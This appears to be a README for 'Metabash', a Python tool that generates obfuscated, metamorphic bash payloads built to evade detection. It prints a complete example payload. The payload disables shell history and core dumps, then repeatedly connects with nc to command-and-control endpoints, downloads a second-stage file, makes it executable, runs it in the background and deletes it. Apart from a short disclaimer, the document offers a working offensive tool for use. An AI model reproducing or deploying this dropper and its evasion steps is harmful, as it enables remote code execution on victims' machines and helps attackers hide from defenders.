# Metabash Payload Generator

## Overview

This project is a **metamorphic Linux payload generator** written in Python. It creates highly obfuscated, variable, and evasive bash payloads for red team, research, and educational purposes.

## How It Works

The payload generator leverages several advanced techniques to produce unique, evasive bash payloads on every run:

- **Metamorphic Code Generation:**
  - Every payload is constructed with randomized variable and function names, using a mix of ASCII and Unicode characters, to evade static analysis and signature-based detection.
  - The order and content of code blocks (e.g., junk code, evasion, network logic) are shuffled and injected with random junk code, making each payload structurally unique.

- **Obfuscation Techniques:**
  - Strings and integers are obfuscated using multiple methods (base64, hex, split, XOR, etc.), making it difficult to extract meaningful information through simple inspection.
  - Junk code (random variables, functions, comments, and data structures) is inserted throughout the payload to further hinder analysis and increase entropy.

- **Linux-Specific Evasion:**
  - Payloads include random Linux evasion techniques, such as disabling core dumps, clearing environment variables, disabling shell history, and clearing the terminal.
  - These techniques help the payload avoid detection and forensic analysis on target systems.

- **Network Callback Logic:**
  - Each payload contains logic to connect to a random Command & Control (C2) endpoint from a configurable list (using generic examples by default).
  - Upon successful connection, the payload attempts to receive a secondary payload, saves it to a temporary file, makes it executable, and runs it in the background.
  - The payload cleans up after itself by deleting temporary files and can retry connections with randomized sleep intervals.

- **Helper Functions:**
  - The generated bash scripts include helper functions for encoding/decoding (base64, hex, rot13, unicode, binary) and network operations (connection checks, data transfer, cleanup).

- **Self-Containment:**
  - All generated payloads are fully self-contained and require no external dependencies beyond standard Linux utilities (bash, nc, xxd, base64, etc.).

## Diagrams and Examples

### Payload Generation Flow

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│                 │     │                 │     │                 │
│  Input Config   │────▶│  Generate Code  │────▶│  Write Payload  │
│                 │     │                 │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Example Payload Structure

```
#!/bin/bash
set -e

# Evasion Techniques
ulimit -c 0
unset HISTFILE
unset HISTSIZE
unset HISTFILESIZE
unset HISTCONTROL
unset HISTIGNORE
set +m
clear
set +o history

# Helper Functions
function str_to_bytes() {
    echo -n "$1" | xxd -p
}

function to_base64() {
    echo -n "$1" | base64
}

function from_base64() {
    echo -n "$1" | base64 -d
}

function to_hex() {
    echo -n "$1" | xxd -p
}

function from_hex() {
    echo -n "$1" | xxd -r -p
}

function rot13() {
    echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

function to_unicode() {
    echo -n "$1" | xxd -p | sed 's/\(..\)/\\\\u00\\1/g'
}

function from_unicode() {
    echo -n "$1" | sed 's/\\\\u00\(..\)/\\1/g' | xxd -r -p
}

function to_binary() {
    echo -n "$1" | xxd -b | cut -d' ' -f2-7 | tr -d ' '
}

function from_binary() {
    echo "$1" | sed 's/\(........\)/\\1 /g' | tr -d ' ' | perl -lpe '$_=pack("B*",$_)'
}

# Network Operations
while true; do
    for endpoint in "example.com:4444" "example.com:9000" "example.com:1337" "192.0.2.1:4444" "192.0.2.1:9000" "192.0.2.1:1337"; do
        host="${endpoint%%:*}"
        port="${endpoint##*:}"
        
        # Try to connect
        if nc -z -w 5 "$host" "$port" 2>/dev/null; then
            # Create temporary file
            buffer=$(mktemp)
            
            # Receive data
            if nc -w 10 "$host" "$port" > "$buffer" 2>/dev/null; then
                # Check if we got any data
                if [ -s "$buffer" ]; then
                    # Make executable and run
                    chmod +x "$buffer"
                    "$buffer" &
                    # Wait a bit to ensure it started
                    sleep 2
                    # Clean up
                    rm -f "$buffer"
                fi
            fi
        fi
    done
    # Random sleep between attempts
    sleep $((RANDOM % 30 + 10))
done
```

### Example Output

Running the generator produces a unique payload file, e.g., `payload_20250517_205214_6BK6sfSE.sh`, with randomized variable names, obfuscated strings, and shuffled code blocks.

## Features
- Generates unique, obfuscated bash payloads each run
- Implements Linux-specific evasion techniques
- Morphs variable and function names for each payload
- Obfuscates strings and integers in multiple ways
- Adds random junk code for metamorphism
- Network callback: payloads attempt to connect to random C2 endpoints (now generic example endpoints for public release)
- Helper functions for encoding/decoding and network operations
- Fully self-contained, no external dependencies required for generated payloads

## Usage

1. **Clone the repository:**
   ```bash
   git clone https://github.com/yourusername/metabash.git
   cd metabash
   ```
2. **Generate a payload:**
   ```bash
   python3 payload_generator.py
   ```
   This will create a new, unique bash payload script (e.g., `payload_YYYYMMDD_HHMMSS_xxxxxxxx.sh`).

3. **Test the payload:**
   ```bash
   bash payload_YYYYMMDD_HHMMSS_xxxxxxxx.sh
   ```

4. **Batch generate multiple payloads:**
   ```bash
   for i in {1..10}; do python3 payload_generator.py; done
   ```

## File Structure
- `payload_generator.py` — Main Python script for generating payloads
- `payload_*.sh` — Generated bash payloads
- `README.md` — This documentation

## Disclaimer

**This tool is for educational and authorized red team use only.**
- Do not use this tool on systems you do not own or have explicit permission to test.
- The authors are not responsible for any misuse or damage caused by this tool.

## License
MIT 